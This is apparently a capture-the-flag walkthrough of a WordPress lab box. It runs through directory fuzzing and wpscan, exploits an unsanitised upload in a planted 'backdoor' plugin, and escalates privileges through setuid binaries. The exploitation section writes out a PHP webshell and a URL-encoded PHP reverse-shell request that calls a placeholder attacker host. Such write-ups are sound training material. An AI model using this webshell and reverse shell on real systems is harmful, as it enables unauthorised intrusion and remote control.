
# PORT SCAN
---


| PORT | SERVICE |
| :--- | :------ |
| 80   | HTTP    |



# RECONNAISSANCE
---

First thing we find on the page is this:

![Pasted image 20250821175528.png](../../IMAGES/Pasted%20image%2020250821175528.png)

Time to fuzz:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt:FUZZ -u 'http://172.17.0.2/FUZZ' -ic -c -t 200 -e .php,.html,.js,.git,.json,.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://172.17.0.2/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
 :: Extensions       : .php .html .js .git .json .txt 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 933
________________________________________________

.php                    [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 19ms]
.html                   [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 78ms]
index.php               [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 122ms]
wp-content              [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 2ms]
wp-login.php            [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 17ms]
license.txt             [Status: 200, Size: 19915, Words: 3331, Lines: 385, Duration: 4ms]
wp-includes             [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 0ms]
functions.php           [Status: 200, Size: 42, Words: 2, Lines: 2, Duration: 0ms]
wp-trackback.php        [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 19ms]
wp-admin                [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 0ms]
xmlrpc.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 69ms]
wp-signup.php           [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 222ms]
.html                   [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 0ms]
.php                    [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 2ms]
server-status           [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 1ms]
```


This is a WordPress installation, we need to add `devil.lab` to `/etc/hosts` and proceed to use wpscan:

```
echo '172.17.0.2 devil.lab' | sudo tee -a /etc/hosts
```

Then:

```
wpscan --url http://devil.lab -e vp,vt,tt,cb,dbe,u

_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://devil.lab/ [172.17.0.2]
[+] Started: Tue Aug 19 21:28:13 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.58 (Ubuntu)
 | Found By: Headers (../../IMAGES/Passive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://devil.lab/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://devil.lab/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.6.2 identified (Outdated, released on 2024-09-10).
 | Found By: Query Parameter In Install Page (Aggressive Detection)
 |  - http://devil.lab/wp-includes/css/dashicons.min.css?ver=6.6.2
 |  - http://devil.lab/wp-includes/css/buttons.min.css?ver=6.6.2
 |  - http://devil.lab/wp-admin/css/forms.min.css?ver=6.6.2
 |  - http://devil.lab/wp-admin/css/l10n.min.css?ver=6.6.2
 |  - http://devil.lab/wp-admin/css/install.min.css?ver=6.6.2

[i] The main theme could not be detected.

[+] Enumerating Vulnerable Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:00 <===========================================================================================================================> (652 / 652) 100.00% Time: 00:00:00

[i] No themes Found.

[+] Enumerating Timthumbs (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:01 <=========================================================================================================================> (2568 / 2568) 100.00% Time: 00:00:01

[i] No Timthumbs Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <============================================================================================================================> (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] Enumerating DB Exports (via Passive and Aggressive Methods)
 Checking DB Exports - Time: 00:00:00 <==================================================================================================================================> (75 / 75) 100.00% Time: 00:00:00

[i] No DB Exports Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <=============================================================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] devil
 | Found By: Author Posts - Display Name (../../IMAGES/Passive Detection)
 | Confirmed By:
 |  Rss Generator (../../IMAGES/Passive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
```


We find an user named `devil`, unfortunately for us, we can't go into `wp-admin` or `wp-login.php` since it always redirect us back to the home page, so, brute force is not the way on this machine, let's use `feroxbuster` to check more hidden assets:

```bash
feroxbuster -u http://devil.lab -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -x php,html,txt,json,js
```

On the command, we can find this interesting output:

![Pasted image 20250821175538.png](../../IMAGES/Pasted%20image%2020250821175538.png)

There's a plugin named `backdoor`, let's check it:

![Pasted image 20250821175541.png](../../IMAGES/Pasted%20image%2020250821175541.png)

We can find some files called `mycv`, if we open the `mycv.php` file, we see this:

![Pasted image 20250821175545.png](../../IMAGES/Pasted%20image%2020250821175545.png)

Based on the error, this seems to be some sort of webshell/backdoor disguised as a harmless cv file, on `index.php`, we can upload our CV:

![Pasted image 20250821175550.png](../../IMAGES/Pasted%20image%2020250821175550.png)

Let's begin exploitation.

# EXPLOITATION
---

We know there may not be a proper sanitization on this file upload due to the `.php` file we saw before, let's try to upload a simple webshell and check if it works:

```php
<?php echo shell_exec($_GET['cmd']); ?>
```

![Pasted image 20250821175556.png](../../IMAGES/Pasted%20image%2020250821175556.png)

No sanitization on the uploads functionality, we don't even need to do some sort of bypass, since our file has been uploaded, let's test if it works:

![Pasted image 20250821175600.png](../../IMAGES/Pasted%20image%2020250821175600.png)

We got RCE, time to send ourselves a revshell:

```
http://devil.lab/wp-content/plugins/backdoor/uploads/webshell.php?cmd=php+-r+%27%24sock%3dfsockopen(%22CHANGE_IP%22%2C4444)%3bexec(%22%2Fbin%2Fsh+-i+%3C%263+%3E%263+2%3E%263%22)%3b%27
```

If we check our listener:

![Pasted image 20250821175605.png](../../IMAGES/Pasted%20image%2020250821175605.png)

We got our shell, time to begin privilege escalation.

# PRIVILEGE ESCALATION
---

Let's run linpeas:

![Pasted image 20250821175609.png](../../IMAGES/Pasted%20image%2020250821175609.png)

We find a `demon.txt` file inside of `/var/backups`, let's check it:

```
www-data@7d3de052432d:/var/backups$ cat demon.txt 
cat: demon.txt: Permission denied
```

Can't read it, let's keep digging the linpeas scan:

![Pasted image 20250821175612.png](../../IMAGES/Pasted%20image%2020250821175612.png)

```
www-data@7d3de052432d:/var/backups$ cat /home/andy/.pista.txt
cm90ODAwMAo=
```

If we decoded it, we find this:

```bash
echo 'cm90ODAwMAo=' | base64 -d
rot8000
```

It says `rot8000`, inside of `andy` home, we can also find a password.txt file:

```bash
www-data@7d3de052432d:/home/andy/aquilatienes$ cat password.txt 
ç±ªç±·ç±­ç²ç±ç±µç±ªç±µç±¸ç±¬ç±ªç°º
```

So, based on the hint, we can decrypt the password and get access as Andy, but this is a rabbit hole, I tried for a long time with no luck, inside of andy's home, we can find a `.secret` directory:

```
www-data@7d3de052432d:/home/andy$ ls -la
total 40
drwxr-xr-x 1 andy andy 4096 Sep 11  2024 .
drwxr-xr-x 1 root root 4096 Sep 11  2024 ..
-rwxr-xr-x 1 andy andy  334 Sep 11  2024 .bash_history
-rwxr-xr-x 1 andy andy  220 Mar 31  2024 .bash_logout
-rwxr-xr-x 1 andy andy 3771 Mar 31  2024 .bashrc
-rwxr-xr-x 1 root root   13 Sep 11  2024 .pista.txt
-rwxr-xr-x 1 andy andy  807 Mar 31  2024 .profile
drwxr-xr-x 1 andy andy 4096 Sep 11  2024 .secret
-rwxr-xr-x 1 andy andy  867 Sep 11  2024 .viminfo
drwxr-xr-x 1 root root 4096 Sep 11  2024 aquilatienes
```

We find some stuff:

```
www-data@7d3de052432d:/home/andy$ ls -la .secret
total 28
drwxr-xr-x 1 andy andy  4096 Sep 11  2024 .
drwxr-xr-x 1 andy andy  4096 Sep 11  2024 ..
-rwxr-xr-x 1 andy andy   512 Sep 11  2024 escalate.c
-rwxr-xr-x 1 andy andy 16176 Sep 11  2024 ftpserver
```

There's a `escalate.c` file with the following content:

```c
www-data@7d3de052432d:/home/andy$ cat .secret/escalate.c 
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    // El UID de lucas (obténlo con el comando 'id lucas')
    uid_t lucas_uid = 1001;

    // Cambiar el UID efectivo al de lucas
    if (setuid(lucas_uid) == -1) {
        perror("Error cambiando el UID");
        return 1;
    }

    // Verifica el UID actual
    printf("UID actual: %d\n", getuid());
    printf("EUID actual: %d\n", geteuid());

    // Invoca una shell como el usuario lucas
    system("/bin/bash");

    return 0;
}
```

Based on the script, we can get a shell as lucas abusing this script, we can also find a `ftpserver` file which is the compiled version of this file, once we execute it, we get a shell as lucas:

```
www-data@7d3de052432d:/home/andy/.secret$ ./ftpserver 
UID actual: 1001
EUID actual: 1001
bash: ¡Bienvenido: command not found
lucas@7d3de052432d:/home/andy/.secret$
```

![Pasted image 20250821175624.png](../../IMAGES/Pasted%20image%2020250821175624.png)

Now, remember the `demon,txt` file we couldn't read earlier, let's check it now:

```
lucas@7d3de052432d:/home/andy$ cat /var/backups/demon.txt 
Has encontrado el archivo secreto. El siguiente paso es un desafío: Encuentra el archivo 'bonus.sh' en tu directorio personal y ejecútalo. ¡Buena suerte!
```

Seems we need to check for a file named `bonus,sh` inside our home:

```
lucas@7d3de052432d:/home/lucas$ ls -la
total 32
drwxr-x--- 3 lucas lucas 4096 Sep 11  2024 .
drwxr-xr-x 1 root  root  4096 Sep 11  2024 ..
-rw------- 1 lucas lucas    8 Sep 11  2024 .bash_history
-rw-r--r-- 1 lucas lucas  220 Mar 31  2024 .bash_logout
-rw-r--r-- 1 lucas lucas 3908 Sep 11  2024 .bashrc
drwxr-xr-x 2 root  root  4096 Sep 11  2024 .game
-rw-r--r-- 1 lucas lucas  807 Mar 31  2024 .profile
-rw-r--r-- 1 root  root    89 Sep 11  2024 bonus.txt
```

We find a `bonus.txt` file, must be a typo from the box's author, if we check bonus, we find this:

```
lucas@7d3de052432d:/home/lucas$ cat bonus.txt 
Casi lo  logras! Pero antes deberas jugar, encuentra el juego en tu directorio personal.
```

We need to play, on our home directory, we find a `.game` directory:

```
lucas@7d3de052432d:/home/lucas/.game$ ls -la
total 28
drwxr-xr-x 2 root  root   4096 Sep 11  2024 .
drwxr-x--- 3 lucas lucas  4096 Sep 11  2024 ..
-rwsr-xr-x 1 root  root  16184 Sep 11  2024 EligeOMuere
-rw-r--r-- 1 root  root    621 Sep 11  2024 game.c
```

Got a `game.c` file and a compiled version of it, let's check the code:

```c
lucas@7d3de052432d:/home/lucas/.game$ cat game.c 
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    int guess;
    int secret_number = 7; // Número secreto para ganar

    printf("¡Bienvenido al juego de adivinanzas!\n");
    printf("Adivina el número secreto (entre 1 y 10): ");
    scanf("%d", &guess);

    if (guess == secret_number) {
        printf("¡Felicidades! Has adivinado el número.\n");
        printf("Iniciando shell como root...\n");

        // Cambia el UID efectivo a root (0)
        setuid(0);
        system("/bin/bash");
    } else {
        printf("Número incorrecto. Intenta de nuevo.\n");
    }

    return 0;
}
```

Pretty simple privesc, we just need to input 7 once we execute the file in order to get a shell as root:

```
lucas@7d3de052432d:/home/lucas/.game$ ./EligeOMuere 
¡Bienvenido al juego de adivinanzas!
Adivina el número secreto (entre 1 y 10): 7
¡Felicidades! Has adivinado el número.
Iniciando shell como root...
root@7d3de052432d:/home/lucas/.game#
```

![Pasted image 20250821175630.png](../../IMAGES/Pasted%20image%2020250821175630.png)


